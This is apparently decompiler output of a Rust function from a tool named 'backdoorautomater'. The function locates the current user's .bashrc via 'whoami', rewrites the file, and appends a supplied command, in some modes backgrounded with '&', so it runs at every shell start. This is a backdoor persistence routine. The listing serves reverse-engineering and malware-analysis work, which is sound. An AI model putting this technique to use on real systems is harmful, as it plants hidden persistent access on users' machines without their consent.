long _ZN17backdoorautomater11shellscript13modify_bashrc17h273b1bb4da291c9bE
               (long param_1,uint param_2)

{
  long lVar1;
  bool bVar2;
  undefined8 uVar3;
  long lVar4;
  int local_314;
  long local_310;
  int local_308;
  int iStack_304;
  undefined4 uStack_300;
  undefined4 uStack_2fc;
  undefined8 local_2f8;
  undefined4 local_2d0;
  undefined4 uStack_2cc;
  undefined4 uStack_2c8;
  undefined4 uStack_2c4;
  undefined8 local_2c0;
  undefined4 local_2b8;
  undefined4 uStack_2b4;
  undefined4 uStack_2b0;
  undefined4 uStack_2ac;
  undefined8 local_2a8;
  undefined8 local_2a0;
  undefined8 local_298;
  undefined8 local_290;
  int local_288;
  int iStack_284;
  undefined4 uStack_280;
  undefined4 uStack_27c;
  undefined8 local_278;
  int local_268;
  int iStack_264;
  undefined4 uStack_260;
  undefined4 uStack_25c;
  undefined8 local_258;
  uint local_244;
  long local_240;
  undefined8 local_238;
  undefined8 uStack_230;
  undefined8 local_228;
  undefined8 uStack_220;
  undefined8 uStack_218;
  undefined8 uStack_210;
  undefined4 local_168;
  undefined4 uStack_164;
  undefined4 uStack_160;
  undefined4 uStack_15c;
  undefined8 local_158;
  undefined4 local_148;
  undefined4 uStack_144;
  undefined4 uStack_140;
  undefined4 uStack_13c;
  undefined8 local_138;
  undefined4 local_128;
  undefined4 uStack_124;
  undefined4 uStack_120;
  undefined4 uStack_11c;
  undefined8 local_118;
  undefined local_108 [16];
  undefined8 local_f8;
  undefined local_f0 [8];
  undefined8 local_e8;
  undefined8 local_e0;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined4 local_b8;
  undefined4 uStack_b4;
  undefined4 uStack_b0;
  undefined4 uStack_ac;
  undefined8 local_a8;
  undefined4 local_98;
  undefined4 uStack_94;
  undefined4 uStack_90;
  undefined4 uStack_8c;
  undefined8 local_88;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 local_58;
  undefined8 uStack_50;
  undefined local_48 [24];
  
  local_238 = &PTR_s_Trying_to_find_the__bashrc_file_o_0032a890;
  uStack_230 = 1;
  local_228 = 8;
  uStack_220 = 0;
  uStack_218 = 0;
                    /* try { // try from 0016035a to 00160380 has its CatchHandler @ 00160ed8 */
  local_310 = param_1;
  (*(code *)PTR__ZN3std2io5stdio6_print17h9670eaecb29bc3fcE_00368b80)(&local_238);
  _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
            (&local_238,"whoami",6);
  local_158 = local_228;
  local_168 = (int)local_238;
  uStack_164 = local_238._4_4_;
  uStack_160 = (undefined4)uStack_230;
  uStack_15c = uStack_230._4_4_;
                    /* try { // try from 001603a1 to 001603b9 has its CatchHandler @ 00160ea8 */
  _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_238,"sh",2);
                    /* try { // try from 001603ba to 00160409 has its CatchHandler @ 00160ee7 */
  uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_238,"-c",2);
  uVar3 = _ZN3std7process7Command3arg17h1a6c514e95e1ad22E(uVar3,&local_168);
  (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_308,uVar3);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
            (local_f0,&local_308,&PTR_s_src_shellscript_rs_0032a8a0);
                    /* try { // try from 0016040a to 00160431 has its CatchHandler @ 00160ed3 */
  _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_238);
  (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
            (&local_308,local_d0,local_c8);
                    /* try { // try from 00160432 to 0016044b has its CatchHandler @ 00160ebf */
  uVar3 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                    (&local_308);
  _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
            (&local_238,uVar3);
  local_138 = local_228;
  local_148 = (int)local_238;
  uStack_144 = local_238._4_4_;
  uStack_140 = (undefined4)uStack_230;
  uStack_13c = uStack_230._4_4_;
                    /* try { // try from 0016046c to 0016049d has its CatchHandler @ 00160ee2 */
  _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E(&local_308);
  _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_148);
  (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
            (&local_308,local_e8,local_e0);
                    /* try { // try from 0016049e to 001604b7 has its CatchHandler @ 00160eb0 */
  uVar3 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                    (&local_308);
  _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
            (&local_238,uVar3);
  local_118 = local_228;
  local_128 = (int)local_238;
  uStack_124 = local_238._4_4_;
  uStack_120 = (undefined4)uStack_230;
  uStack_11c = uStack_230._4_4_;
                    /* try { // try from 001604d8 to 0016052b has its CatchHandler @ 00160ece */
  _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E(&local_308);
  local_238 = (undefined **)0x26713a;
  uStack_230 = 6;
  local_228 = CONCAT44(uStack_11c,uStack_120);
  uStack_220 = local_118;
  _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_308,&local_238,2,1,0);
  local_278 = local_2f8;
  local_288 = local_308;
  iStack_284 = iStack_304;
  uStack_280 = uStack_300;
  uStack_27c = uStack_2fc;
                    /* try { // try from 00160551 to 0016055d has its CatchHandler @ 00160edd */
  _ZN5alloc3str21__LT_impl_u20_str_GT_7replace17h19a542f01e4bce42E
            (&local_238,CONCAT44(uStack_2fc,uStack_300));
                    /* try { // try from 0016055e to 0016056a has its CatchHandler @ 00160e83 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_288);
  local_278 = local_228;
  local_288 = (int)local_238;
  iStack_284 = local_238._4_4_;
  uStack_280 = (undefined4)uStack_230;
  uStack_27c = uStack_230._4_4_;
                    /* try { // try from 0016058b to 001605b8 has its CatchHandler @ 00160edd */
  _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_288,&DAT_002656a6,8)
  ;
  _ZN3std2fs4File4open17hc9cc0415293bf7f9E(&local_238,&local_288);
  lVar4 = uStack_230;
  if ((int)local_238 == 0) {
                    /* try { // try from 00160632 to 00160643 has its CatchHandler @ 00160edd */
    _ZN3std2io8buffered9bufreader18BufReader_LT_R_GT_13with_capacity17hfc22a243c8e8e3e1E
              (&local_78,0x2000,local_238._4_4_);
    local_2a0 = 0;
    local_298 = 8;
    local_290 = 0;
    uStack_218 = local_58;
    uStack_210 = uStack_50;
    local_228 = local_68;
    uStack_220 = uStack_60;
    local_238 = (undefined **)CONCAT44(uStack_74,local_78);
    uStack_230 = CONCAT44(uStack_6c,uStack_70);
    local_240 = -0x7fffffffffffffff;
    local_244 = param_2;
    while( true ) {
                    /* try { // try from 001606d0 to 00160729 has its CatchHandler @ 00160ef9 */
      _ZN82__LT_std__io__Lines_LT_B_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h114c8ea989dd5339E
                (&local_308,&local_238);
      lVar1 = CONCAT44(iStack_304,local_308);
      if (lVar1 == local_240) break;
      lVar4 = CONCAT44(uStack_2fc,uStack_300);
      if (lVar1 == -0x8000000000000000) {
        _ZN4core3ptr103drop_in_place_LT_std__io__Lines_LT_std__io__buffered__bufreader__BufReader_LT_std__fs__File_GT__GT__GT_17hdb5dfe103db56feeE
                  (&local_238);
        goto LAB_00160799;
      }
      local_f8 = local_2f8;
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h3237d89e60f90e3aE(&local_2a0,local_108);
    }
                    /* try { // try from 0016072e to 00160795 has its CatchHandler @ 00160e73 */
    _ZN4core3ptr103drop_in_place_LT_std__io__Lines_LT_std__io__buffered__bufreader__BufReader_LT_std__fs__File_GT__GT__GT_17hdb5dfe103db56feeE
              (&local_238);
    local_228 = local_278;
    local_238 = (undefined **)CONCAT44(iStack_284,local_288);
    uStack_230 = CONCAT44(uStack_27c,uStack_280);
    _ZN3std2fs4File6create17h8563d56de2c98b4aE(&local_308,&local_238);
    if (local_308 == 0) {
      local_314 = iStack_304;
      if ((char)local_244 == '\x01') {
        local_228 = *(undefined8 *)(local_310 + 8);
        uStack_220 = *(undefined8 *)(local_310 + 0x10);
        local_238 = (undefined **)&DAT_002656ae;
        uStack_230 = 8;
                    /* try { // try from 00160b00 to 00160b1e has its CatchHandler @ 00160dcd */
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_308,&local_238,2,1,0);
        local_258 = local_2f8;
        local_268 = local_308;
        iStack_264 = iStack_304;
        uStack_260 = uStack_300;
        uStack_25c = uStack_2fc;
                    /* try { // try from 00160b39 to 00160b9c has its CatchHandler @ 00160da4 */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_268," &",2);
        _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                  (&local_238,"\n",1);
        local_a8 = local_228;
        local_b8 = (int)local_238;
        uStack_b4 = local_238._4_4_;
        uStack_b0 = (undefined4)uStack_230;
        uStack_ac = uStack_230._4_4_;
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h3237d89e60f90e3aE(&local_2a0,&local_b8);
        local_228 = local_258;
        local_238 = (undefined **)CONCAT44(iStack_264,local_268);
        uStack_230 = CONCAT44(uStack_25c,uStack_260);
                    /* try { // try from 00160bbf to 00160bd0 has its CatchHandler @ 00160da0 */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h3237d89e60f90e3aE(&local_2a0,&local_238);
        _ZN90__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__iter__traits__collect__IntoIterator_GT_9into_iter17h2e8f7014354aaec8E
                  (&local_238,&local_2a0);
        _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h09279fcf7e353782E
                  (&local_2d0,&local_238);
        if (CONCAT44(uStack_2cc,local_2d0) != -0x8000000000000000) {
          do {
            local_2a8 = local_2c0;
            local_2b8 = local_2d0;
            uStack_2b4 = uStack_2cc;
            uStack_2b0 = uStack_2c8;
            uStack_2ac = uStack_2c4;
                    /* try { // try from 00160c3a to 00160c41 has its CatchHandler @ 00160de4 */
            _ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E
                      (&local_308,&local_2b8);
                    /* try { // try from 00160c42 to 00160c67 has its CatchHandler @ 00160df3 */
            _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                      (&local_308,"\n",1);
            lVar4 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                              (&local_314,CONCAT44(uStack_2fc,uStack_300),local_2f8);
            if (lVar4 != 0) {
                    /* try { // try from 00160d5e to 00160d67 has its CatchHandler @ 00160d98 */
              _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E
                        (&local_308);
                    /* try { // try from 00160d68 to 00160d71 has its CatchHandler @ 00160d94 */
              _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E
                        (&local_2b8);
                    /* try { // try from 00160d74 to 00160d80 has its CatchHandler @ 00160da0 */
              _ZN4core3ptr81drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_alloc__string__String_GT__GT_17h89d95cf2cdcb35ebE
                        (&local_238);
              goto LAB_00160d81;
            }
                    /* try { // try from 00160c74 to 00160c7b has its CatchHandler @ 00160de4 */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_308)
            ;
                    /* try { // try from 00160c7c to 00160c83 has its CatchHandler @ 00160dd5 */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2b8)
            ;
            _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h09279fcf7e353782E
                      (&local_2d0,&local_238);
          } while (CONCAT44(uStack_2cc,local_2d0) != -0x8000000000000000);
        }
                    /* try { // try from 00160ca4 to 00160cb0 has its CatchHandler @ 00160da0 */
        _ZN4core3ptr81drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_alloc__string__String_GT__GT_17h89d95cf2cdcb35ebE
                  (&local_238);
LAB_00160cb1:
        bVar2 = true;
      }
      else {
        if ((local_244 & 0xff) == 2) {
          local_228 = *(undefined8 *)(local_310 + 8);
          uStack_220 = *(undefined8 *)(local_310 + 0x10);
          local_238 = (undefined **)0x267140;
          uStack_230 = 5;
          _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_308,&local_238,2,1,0);
          local_258 = local_2f8;
          local_268 = local_308;
          iStack_264 = iStack_304;
          uStack_260 = uStack_300;
          uStack_25c = uStack_2fc;
                    /* try { // try from 00160955 to 001609b8 has its CatchHandler @ 00160db6 */
          _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_268," &",2);
          _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                    (&local_238,"\n",1);
          local_88 = local_228;
          local_98 = (int)local_238;
          uStack_94 = local_238._4_4_;
          uStack_90 = (undefined4)uStack_230;
          uStack_8c = uStack_230._4_4_;
          _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h3237d89e60f90e3aE(&local_2a0,&local_98);
          local_228 = local_258;
          local_238 = (undefined **)CONCAT44(iStack_264,local_268);
          uStack_230 = CONCAT44(uStack_25c,uStack_260);
                    /* try { // try from 001609db to 001609ec has its CatchHandler @ 00160da2 */
          _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h3237d89e60f90e3aE(&local_2a0,&local_238);
          _ZN90__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__iter__traits__collect__IntoIterator_GT_9into_iter17h2e8f7014354aaec8E
                    (&local_238,&local_2a0);
          _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h09279fcf7e353782E
                    (&local_2d0,&local_238);
          if (CONCAT44(uStack_2cc,local_2d0) != -0x8000000000000000) {
            do {
              local_2a8 = local_2c0;
              local_2b8 = local_2d0;
              uStack_2b4 = uStack_2cc;
              uStack_2b0 = uStack_2c8;
              uStack_2ac = uStack_2c4;
                    /* try { // try from 00160a56 to 00160a5d has its CatchHandler @ 00160de9 */
              _ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E
                        (&local_308,&local_2b8);
                    /* try { // try from 00160a5e to 00160a83 has its CatchHandler @ 00160e19 */
              _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                        (&local_308,"\n",1);
              lVar4 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_314,CONCAT44(uStack_2fc,uStack_300),local_2f8);
              if (lVar4 != 0) {
                    /* try { // try from 00160d39 to 00160d42 has its CatchHandler @ 00160d9a */
                _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E
                          (&local_308);
                    /* try { // try from 00160d43 to 00160d4c has its CatchHandler @ 00160d96 */
                _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E
                          (&local_2b8);
                    /* try { // try from 00160d4f to 00160d5b has its CatchHandler @ 00160da2 */
                _ZN4core3ptr81drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_alloc__string__String_GT__GT_17h89d95cf2cdcb35ebE
                          (&local_238);
                goto LAB_00160d81;
              }
                    /* try { // try from 00160a90 to 00160a97 has its CatchHandler @ 00160de9 */
              _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E
                        (&local_308);
                    /* try { // try from 00160a98 to 00160a9f has its CatchHandler @ 00160dda */
              _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E
                        (&local_2b8);
              _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h09279fcf7e353782E
                        (&local_2d0,&local_238);
            } while (CONCAT44(uStack_2cc,local_2d0) != -0x8000000000000000);
          }
                    /* try { // try from 00160ac0 to 00160acc has its CatchHandler @ 00160da2 */
          _ZN4core3ptr81drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_alloc__string__String_GT__GT_17h89d95cf2cdcb35ebE
                    (&local_238);
          goto LAB_00160cb1;
        }
        if ((local_244 & 0xff) == 3) {
                    /* try { // try from 001607e4 to 00160808 has its CatchHandler @ 00160dcd */
          (*(code *)
            PTR__ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E_00368788
          )(local_48,local_310);
          _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h3237d89e60f90e3aE(&local_2a0,local_48);
          _ZN90__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__iter__traits__collect__IntoIterator_GT_9into_iter17h2e8f7014354aaec8E
                    (&local_238,&local_2a0);
          _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h09279fcf7e353782E
                    (&local_2d0,&local_238);
          if (CONCAT44(uStack_2cc,local_2d0) != -0x8000000000000000) {
LAB_0016085e:
            local_2a8 = local_2c0;
            local_2b8 = local_2d0;
            uStack_2b4 = uStack_2cc;
            uStack_2b0 = uStack_2c8;
            uStack_2ac = uStack_2c4;
                    /* try { // try from 00160872 to 00160879 has its CatchHandler @ 00160dee */
            _ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E
                      (&local_308,&local_2b8);
                    /* try { // try from 0016087a to 0016089f has its CatchHandler @ 00160e3f */
            _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                      (&local_308,"\n",1);
            lVar4 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                              (&local_314,CONCAT44(uStack_2fc,uStack_300),local_2f8);
            if (lVar4 == 0) goto LAB_001608ac;
                    /* try { // try from 00160d14 to 00160d1d has its CatchHandler @ 00160d9e */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_308)
            ;
                    /* try { // try from 00160d1e to 00160d27 has its CatchHandler @ 00160d9c */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2b8)
            ;
                    /* try { // try from 00160d2a to 00160d36 has its CatchHandler @ 00160dcd */
            _ZN4core3ptr81drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_alloc__string__String_GT__GT_17h89d95cf2cdcb35ebE
                      (&local_238);
LAB_00160d81:
                    /* try { // try from 00160d87 to 00160d8e has its CatchHandler @ 00160e73 */
            _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_314);
            goto LAB_001605d8;
          }
LAB_001608da:
                    /* try { // try from 001608dc to 0016093a has its CatchHandler @ 00160dcd */
          _ZN4core3ptr81drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_alloc__string__String_GT__GT_17h89d95cf2cdcb35ebE
                    (&local_238);
          goto LAB_00160cb1;
        }
        bVar2 = false;
      }
                    /* try { // try from 00160cc1 to 00160cc5 has its CatchHandler @ 00160e73 */
      _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_314);
      if (!bVar2) {
                    /* try { // try from 00160cce to 00160cd7 has its CatchHandler @ 00160edd */
        _ZN4core3ptr65drop_in_place_LT_alloc__vec__Vec_LT_alloc__string__String_GT__GT_17h8814db29c860c5cdE
                  (&local_2a0);
      }
                    /* try { // try from 00160cd8 to 00160ce4 has its CatchHandler @ 00160ee2 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_128);
                    /* try { // try from 00160ce5 to 00160cf1 has its CatchHandler @ 00160ed3 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_148);
                    /* try { // try from 00160cf2 to 00160cfe has its CatchHandler @ 00160ea8 */
      _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_f0);
                    /* try { // try from 00160cff to 00160d0b has its CatchHandler @ 00160ed8 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_168);
      lVar4 = 0;
      goto LAB_0016060c;
    }
    lVar4 = CONCAT44(uStack_2fc,uStack_300);
LAB_00160799:
                    /* try { // try from 00160799 to 001607a2 has its CatchHandler @ 00160edd */
    _ZN4core3ptr65drop_in_place_LT_alloc__vec__Vec_LT_alloc__string__String_GT__GT_17h8814db29c860c5cdE
              (&local_2a0);
    if (lVar1 != local_240) goto LAB_001605cb;
  }
  else {
LAB_001605cb:
                    /* try { // try from 001605cb to 001605d7 has its CatchHandler @ 00160ece */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_288);
  }
LAB_001605d8:
                    /* try { // try from 001605d8 to 001605e4 has its CatchHandler @ 00160ee2 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_128);
                    /* try { // try from 001605e5 to 001605f1 has its CatchHandler @ 00160ed3 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_148);
                    /* try { // try from 001605f2 to 001605fe has its CatchHandler @ 00160ea8 */
  _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_f0);
                    /* try { // try from 001605ff to 0016060b has its CatchHandler @ 00160ed8 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_168);
LAB_0016060c:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_310);
  return lVar4;
LAB_001608ac:
                    /* try { // try from 001608ac to 001608b3 has its CatchHandler @ 00160dee */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_308);
                    /* try { // try from 001608b4 to 001608bb has its CatchHandler @ 00160ddf */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2b8);
  _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h09279fcf7e353782E
            (&local_2d0,&local_238);
  if (CONCAT44(uStack_2cc,local_2d0) == -0x8000000000000000) goto LAB_001608da;
  goto LAB_0016085e;
}